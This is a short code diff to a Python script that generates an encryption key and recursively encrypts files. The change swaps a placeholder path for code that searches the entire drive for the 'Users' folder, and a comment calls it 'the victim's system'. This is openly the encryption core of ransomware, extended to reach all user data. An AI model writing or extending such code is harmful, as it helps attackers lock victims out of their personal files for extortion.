@@ -11,8 +11,11 @@ import os
 key = Fernet.generate_key()
 cipher_suite = Fernet(key)
 
-# Change the directory path to the target directory you want to encrypt
-target_dir = '/path/to/target/dir'
+# Find the 'Users' folder in the whole available drive of the victim's system
+for root, dirs, files in os.walk('/'):
+    if 'Users' in dirs:
+        target_dir = os.path.join(root, 'Users')
+        break
 
 # Recursively walk through the target directory and encrypt each file
 for root, dirs, files in os.walk(target_dir):
